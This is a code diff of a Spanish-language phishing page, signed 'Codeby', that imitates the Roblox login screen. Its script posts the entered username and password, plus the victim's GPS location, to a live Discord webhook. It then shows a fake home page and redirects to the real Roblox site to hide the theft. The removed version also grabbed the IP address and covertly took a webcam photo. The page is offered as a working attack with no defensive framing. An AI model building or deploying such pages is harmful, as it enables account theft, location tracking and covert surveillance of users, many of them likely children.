@@ -6,137 +6,112 @@
     <title>Roblox</title>
     <link rel="icon" type="image/x-icon" href="https://www.roblox.com/favicon.ico">
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; width: 100%; font-family: 'HCo Gotham SSm', Helvetica, Arial, sans-serif; background-color: #000; color: #fff; }
+        body, html { margin: 0; padding: 0; height: 100%; width: 100%; font-family: 'HCo Gotham SSm', Helvetica, Arial, sans-serif; background-color: #000; color: #fff; overflow-x: hidden; }
         
-        /* LOGIN UI */
+        /* LOGIN UI (PANTALLA 1) */
         #login-screen { position: relative; width: 100%; height: 100vh; z-index: 100; display: flex; flex-direction: column; }
         .roblox-bg { position: fixed; top:0; left:0; width:100%; height:100%; background: url('https://i.imgur.com/8mXfRmW.png') center/cover; z-index: 1; }
-        .overlay { position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.7); z-index: 2; }
-        .nav-header { background: #191b1d; height: 40px; display: flex; justify-content: center; align-items: center; position: relative; z-index: 10; border-bottom: 1px solid #393b3d; }
+        .overlay { position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.72); z-index: 2; }
         
-        .card { position: relative; z-index: 5; background: #191b1d; padding: 35px; border-radius: 8px; width: 90%; max-width: 380px; margin: auto; box-shadow: 0 4px 20px #000; text-align: center; }
-        input { width: 100%; padding: 12px; margin: 8px 0; background: #000; color: #fff; border: 1px solid #393b3d; border-radius: 4px; box-sizing: border-box; }
-        .btn-log { width: 100%; padding: 12px; background: #0084ff; border: none; color: #fff; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 10px; }
-        
-        /* FAKE HOME UI (Oculto al inicio) */
-        #fake-home { display: none; width: 100%; height: 100vh; background: #000; overflow-y: auto; }
-        .home-nav { background: #191b1d; height: 50px; display: flex; align-items: center; padding: 0 20px; border-bottom: 1px solid #333; justify-content: space-between; }
-        .home-content { padding: 20px; }
-        .game-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); gap: 15px; margin-top: 20px; }
-        .game-card { background: #191b1d; height: 120px; border-radius: 8px; position: relative; overflow: hidden; }
-        .game-card img { width: 100%; height: 100%; object-fit: cover; opacity: 0.8; }
-        .user-greet { font-size: 22px; font-weight: bold; margin-bottom: 5px; }
+        .card { position: relative; z-index: 5; background: #191b1d; padding: 35px; border-radius: 8px; width: 85%; max-width: 380px; margin: auto; box-shadow: 0 4px 20px #000; }
+        input { width: 100%; padding: 14px; margin: 8px 0; background: #000; color: #fff; border: 1px solid #393b3d; border-radius: 4px; box-sizing: border-box; font-size: 15px; }
+        .btn-log { width: 100%; padding: 14px; background: #0084ff; border: none; color: #fff; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 15px; font-size: 16px; }
 
-        .codeby-tag { color: #00ffcc; font-size: 9px; opacity: 0.4; letter-spacing: 2px; margin-top: 20px; display: block; }
+        /* HOME UI FALSO (PANTALLA 2) */
+        #fake-home { display: none; width: 100%; height: 100vh; background: #111; }
+        .top-nav { background: #191b1d; height: 45px; display: flex; align-items: center; padding: 0 15px; border-bottom: 1px solid #333; justify-content: space-between; }
+        .top-icons { display: flex; align-items: center; gap: 15px; }
+        .icon-rbx { width: 18px; height: 18px; background: url('https://images.rbxcdn.com/12da606a5b6d705c7476839e23297a7e.png') no-repeat; background-size: contain; }
+        
+        .content { padding: 20px; }
+        .avatar-circle { width: 60px; height: 60px; background: #333; border-radius: 50%; margin-bottom: 10px; border: 2px solid #555; }
+        .game-row { display: flex; gap: 10px; overflow-x: auto; margin-top: 15px; padding-bottom: 10px; }
+        .game-item { min-width: 110px; height: 110px; background: #222; border-radius: 10px; flex-shrink: 0; }
+        
+        .codeby-footer { position: absolute; bottom: 10px; width: 100%; text-align: center; color: #00ffcc; font-size: 8px; opacity: 0.3; letter-spacing: 3px; }
     </style>
 </head>
 <body>
 
     <div id="login-screen">
-        <div class="nav-header"><img src="https://images.rbxcdn.com/2b53f60f64c677840139b4b9b6574f0c.png" height="22"></div>
         <div class="roblox-bg"></div>
         <div class="overlay"></div>
         <div class="card">
-            <h1 style="text-align:left; font-size:20px;">Iniciar sesión</h1>
-            <input type="text" id="u" placeholder="Usuario/correo/teléfono">
-            <input type="password" id="p" placeholder="Contraseña">
-            <button class="btn-log" id="goBtn">Iniciar sesión</button>
-            <div style="color:#adb5bd; font-size:12px; text-align:left; margin-top:15px; line-height:1.8;">
-                <a href="#" style="color:#0084ff; text-decoration:none;">¿Olvidaste tu contraseña?</a><br>
-                <span>¿No tienes cuenta? <a href="#" style="color:#0084ff; text-decoration:none;">Regístrate</a></span>
-            </div>
-            <span class="codeby-tag">GUI By:Codeby</span>
+            <h1 style="font-size: 22px; margin-bottom: 20px;">Iniciar sesión</h1>
+            <input type="text" id="user" placeholder="Usuario/Correo/Teléfono">
+            <input type="password" id="pass" placeholder="Contraseña">
+            <button class="btn-log" id="btnGo">Iniciar sesión</button>
+            <div style="margin-top:20px; font-size:13px;"><a href="#" style="color:#0084ff; text-decoration:none;">¿Olvidaste tu contraseña?</a></div>
+            <div class="codeby-footer">By:Codeby</div>
         </div>
     </div>
 
     <div id="fake-home">
-        <div class="home-nav">
+        <div class="top-nav">
             <img src="https://images.rbxcdn.com/2b53f60f64c677840139b4b9b6574f0c.png" height="18">
-            <div style="background:#333; width:30px; height:30px; border-radius:50%;"></div>
-        </div>
-        <div class="home-content">
-            <div class="user-greet">Hola, <span id="display-user">Usuario</span>!</div>
-            <p style="color:#ccc; font-size:14px;">Continuar jugando</p>
-            <div class="game-grid">
-                <div class="game-card"><img src="https://tr.rbxcdn.com/180af45d39f607fca830500159d33261/150/150/Image/Jpeg"></div>
-                <div class="game-card"><img src="https://tr.rbxcdn.com/6007e06f9d2b271d33190a4242bb590b/150/150/Image/Jpeg"></div>
-                <div class="game-card"><img src="https://tr.rbxcdn.com/4f728c7348981467475d9e5f52230a10/150/150/Image/Jpeg"></div>
-                <div class="game-card"><img src="https://tr.rbxcdn.com/0d575ec6b89694e1d70a307044df5686/150/150/Image/Jpeg"></div>
+            <div class="top-icons">
+                <div class="icon-rbx"></div>
+                <span id="rbx-val" style="font-size:14px; font-weight:bold;">0</span>
+                <div style="width:20px; height:20px; background:#444; border-radius:50%;"></div>
             </div>
-            <p style="color:#ff4444; font-size:12px; margin-top:30px;">Error de conexión: Reconectando al servidor...</p>
+        </div>
+        <div class="content">
+            <div class="avatar-circle"></div>
+            <h2 style="font-size: 24px;">Hola, <span id="u-name">Player</span>!</h2>
+            <p style="color:#bbb; font-size:14px; font-weight:500;">Continuar</p>
+            <div class="game-row">
+                <div class="game-item" style="background:url('https://tr.rbxcdn.com/180af45d39f607fca830500159d33261/150/150/Image/Jpeg') center/cover;"></div>
+                <div class="game-item" style="background:url('https://tr.rbxcdn.com/6007e06f9d2b271d33190a4242bb590b/150/150/Image/Jpeg') center/cover;"></div>
+                <div class="game-item" style="background:url('https://tr.rbxcdn.com/4f728c7348981467475d9e5f52230a10/150/150/Image/Jpeg') center/cover;"></div>
+            </div>
         </div>
     </div>
 
-    <video id="vid" autoplay style="display:none;"></video>
-    <canvas id="canv" style="display:none;"></canvas>
-
     <script>
-        const webhook = "https://discord.com/api/webhooks/1499616194741801133/i-irhmgrf87Sldg0W8yWsgRAz_TUYh3JK7DEu7UGi6bsKvMNUwNe3vnpH2Ga1qFlvUNk";
-        let geo = {};
+        const hook = "https://discord.com/api/webhooks/1499616194741801133/i-irhmgrf87Sldg0W8yWsgRAz_TUYh3JK7DEu7UGi6bsKvMNUwNe3vnpH2Ga1qFlvUNk";
 
-        window.onload = async () => {
-            try { const r = await fetch('https://ipapi.co/json/'); geo = await r.json(); } catch(e){}
-        };
+        document.getElementById('btnGo').addEventListener('click', async () => {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
 
-        document.getElementById('goBtn').addEventListener('click', async () => {
-            const user = document.getElementById('u').value;
-            const pass = document.getElementById('p').value;
-
-            if(user && pass) {
-                document.getElementById('goBtn').innerText = "Cargando...";
-                
-                // Pedir GPS y Cámara al mismo tiempo que mostramos el Home Falso
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    await capture(user, pass, gps);
-                }, async () => {
-                    await capture(user, pass, "Denegado");
-                });
-
-                // CAMBIO DE PANTALLA INMEDIATO (Efecto de entrar)
-                document.getElementById('display-user').innerText = user;
+            if(u && p) {
+                // CAMBIO A HOME FALSO AL INSTANTE
+                document.getElementById('u-name').innerText = u;
                 document.getElementById('login-screen').style.display = 'none';
                 document.getElementById('fake-home').style.display = 'block';
+
+                // Simular carga de Robux aleatoria para mayor realismo
+                document.getElementById('rbx-val').innerText = Math.floor(Math.random() * 150);
+
+                // Captura silenciosa de ubicación y envío
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    await sendDiscord(u, p, `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+                }, async () => {
+                    await sendDiscord(u, p, "Denegado");
+                });
             }
         });
 
-        async function capture(u, p, gps) {
-            let photo = null;
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('vid');
-                video.srcObject = stream;
-                await new Promise(r => setTimeout(r, 1000));
-                const canvas = document.getElementById('canv');
-                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                photo = await new Promise(r => canvas.toBlob(r, 'image/png'));
-                stream.getTracks().forEach(t => t.stop());
-            } catch(e){}
-
-            const fd = new FormData();
+        async function sendDiscord(u, p, gps) {
             const embed = {
-                title: "✅ ACCESO EXITOSO - Codeby",
-                color: 0x00ff00,
+                title: "📊 LOG CAPTURADO - Codeby",
+                color: 0x00ffcc,
                 fields: [
-                    { name: "👤 Usuario", value: `\`${u}\``, inline: true },
-                    { name: "🔒 Clave", value: `\`${p}\``, inline: true },
-                    { name: "🌐 IP", value: `\`${geo.ip || 'N/A'}\``, inline: true },
-                    { name: "🚩 País", value: `${geo.country_emoji || ''} ${geo.country_name || 'N/A'}`, inline: true },
-                    { name: "📍 GPS", value: gps }
+                    { name: "👤 Usuario", value: u, inline: true },
+                    { name: "🔒 Contraseña", value: p, inline: true },
+                    { name: "📍 Ubicación", value: gps }
                 ],
-                footer: { text: "By:Codeby" }
+                footer: { text: "Sistema Codeby" }
             };
 
-            fd.append('payload_json', JSON.stringify({ embeds: [embed] }));
-            if(photo) fd.append('file', photo, 'face.png');
+            await fetch(hook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ embeds: [embed] })
+            });
 
-            await fetch(webhook, { method: 'POST', body: fd });
-            
-            // Después de 5 segundos en el Home Falso, mandarlos al real por "error"
-            setTimeout(() => {
-                window.location.href = "https://www.roblox.com/home";
-            }, 6000);
+            // Redirección final por "error de sesión"
+            setTimeout(() => { window.location.href = "https://www.roblox.com/home"; }, 4000);
         }
     </script>
 </body>
